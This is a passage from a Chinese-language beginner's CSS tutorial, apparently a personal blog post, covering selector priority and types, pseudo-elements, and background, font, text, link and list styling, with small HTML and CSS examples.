与bg2的位置交换也不管css解析的事情，所以交换后还是blue。 3：不同类型的选择器：看优先级 先解析低级的在解析高级的：* &lt; div &lt; class &lt; id 123456div&#123; color: red；&#125;.bg1&#123; color: yellow;&#125; /*最终是为黄色*/ 4：多重样式优先级 样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。 一般情况下，优先级如下： 内联样式 &gt; 内部样式 &gt;外部样式 ==（谁优先级越高越最后解析）== 对于全部都是 当加上!important 这个选择器的内容就会最后进行。 继承原则==对于嵌套标签，子级继承父级。== 文字 文本 样式可以继承，其他的不能。 块级元素 没有设置的时候，会继承父级的宽，而高度则是看其内容长短。 CSS组成选择器分组选择器直接上代码了： 123456789div&#123; background: green; color: red;&#125;p&#123; background: green; color: red; font-size: 50px;&#125; 1234567div,p&#123; background: green; color: red;&#125;p&#123; font-size: 50px;&#125; 把div 与 p 里面相同的部分放到一个里面就行了。 嵌套选择器12345div p&#123; background: green; color: red; font-size: 50px;&#125; 12345678910111213&lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt; 只要在其父或父的以上级有div，那这个p里的东西就能生效。 效果： 子选择器这个和以上很类似，区别在只在其父为div时，才能生效。 12345div&gt;p&#123; background: green; color: red; font-size: 50px;&#125; 类比以上就是只有p2有css效果 同级选择器12345div+p&#123; background: green; color: red; font-size: 50px;&#125; 在平级的p才可以生效，对比以上，也就是p1是有css效果。 属性选择器12345p[title=cc]&#123; background: green; color: red; font-size: 50px;&#125; 12345678910111213&lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p title=\"cc 1\"&gt;p1&lt;/p&gt;&lt;/body&gt; 基本标签==+== [属性=值]：p3出现css效果。 [属性~=值]：p1 p3出现css效果。 注意：代码中cc 1需要空格隔开，不隔没有效果。 [属性^=值]：开头有cc的字符就行cc1. p1 p3 出现cc效果。 [属性$=值]：类比^= 是结束。 伪元素选择器每个我自己写出来的元素都会有伪元素。、 例： 123456789&lt;p title=\"cc\"&gt; &lt;!--&lt;before&gt; --&gt; ppp &lt;!--&lt;after&gt; --&gt; &lt;/p&gt; 直接上代码： 1234567p::before&#123; content: \"before\" &#125;p::after&#123; content: \"after\"&#125; 效果： 块元素： 第一个字母：first-letter 第一行：first-line 1234p::first-letter&#123; color: red; font-size: 100px;&#125; 这些写就是会是p内内容第一个字符大写。 也可以为 12345&lt;p title=\"cc\"&gt; &lt;first-letter&gt;t &lt;/first-letter&gt; he way i am ; &lt;/p&gt; CSS 背景CSS 背景属性用于定义HTML元素的背景。 背景颜色background-color 属性定义了元素的背景颜色. 页面的背景颜色使用在body的选择器中: body {background-color:red;} 背景图像background-image属性描述了元素的背景图像. 默认情况下，背景图像进行平铺重复显示. body {background-image:url(&#39;1.png&#39;);} 背景图像 - 相关设置 水平或垂直平铺： 12345body&#123;background-image:url('gradient2.png');background-repeat:repeat-x;&#125; 里面repeat-x是x轴，repeat-y是y轴。 不平铺：background-repeat:no-repeat 定位： ​ background-position:50% 0% 这使其在x轴的中心， ​ x： left center right； ​ y: top center bottom； css字体css字体 字体系列：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。 例：font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;; 字体样式:font-style:italic;斜体 字体大小：font-size 属性设置文本的大小。font-size:40px; font-weight: 设置其粗细。font-weight: normal lighter blod; 练习： 123456body &#123; font-family: \"黑体\",\"宋体\"; font-style:italic; font-size:80px; font-weight: bold;&#125; /*5.css */ 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文字-字体&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"5.css\"&gt;&lt;/head&gt;&lt;body&gt; 这是一段字 &lt;br&gt; hello world!&lt;/body&gt;&lt;/html&gt; CSS - 文本文本属性集合 color属性用于设置文本的颜色 direction属性用于设置文本方向。 letter-spacing属性用于在组成单词的字母之间添加或减去空格。 text-indent属性用于缩进段落的文本。 text-align属性用于对齐文档的文本。 text-decoration属性用于下划线，上划线和删除文本。 text-transform属性用于大写文本或将文本转换为大写或小写字母。 white-space属性用于控制文本的流和格式。 text-shadow属性用于设置文本周围的文本阴影。 文本颜色： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) ==不推荐使用太多浏览器不支持== 颜色的名称 - 如: red 123body &#123;color:red;&#125;h1 &#123;color:#00ff00;&#125;h2 &#123;color:rgb(255,0,0);&#125; 文本的对齐方式文本可居中或对齐到左或右,两端对齐. 12345678910.a1&#123; text-align:right;&#125;.a2&#123; text-align:center;&#125;.a3&#123; text-align:left;&#125; 123456&lt;body&gt; &lt;p class=\"a1\"&gt;这是一段字&lt;/p&gt; &lt;br&gt; &lt;p class=\"a2\"&gt;hello world!&lt;/p&gt; &lt;p class=\"a3\"&gt;hhhhaaaa&lt;/p&gt;&lt;/body&gt; 文本修饰装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。 12345678910.a1&#123; text-decoration:overline;&#125;.a2&#123; text-decoration:line-through;&#125;.a3&#123; text-decoration:underline;&#125; 文本缩进文本缩进属性是用来指定文本的第一行的缩进。 p {text-indent:50px;} 文本方向值是ltr或rtl。 123.a&#123; direction:rtl; &#125; 文字就先写到这。 CSS 链接链接样式 a:link - 正常，未访问过的链接 a:visited - 用户已访问过的链接 a:hover - 当用户鼠标放在链接上时 a:active - 链接被点击的那一刻 a:link {color: red;} CSS列表常用的就是 123456ul&#123; list-style-type: none; list-style-type: disc; 实心圆 list-style-type: circle; 空心圆 list-style-type: square; 实心方格&#125; 最常用就是 none 然后换成自己想弄成的图片。 ol 对应就是 lower-alpha upper-alpha lower-roman等等； 作为列表项标记的图像 1234ul&#123; list-style-image: url(&apos;&apos;);&#125;","categories":[],"tags":[]}]}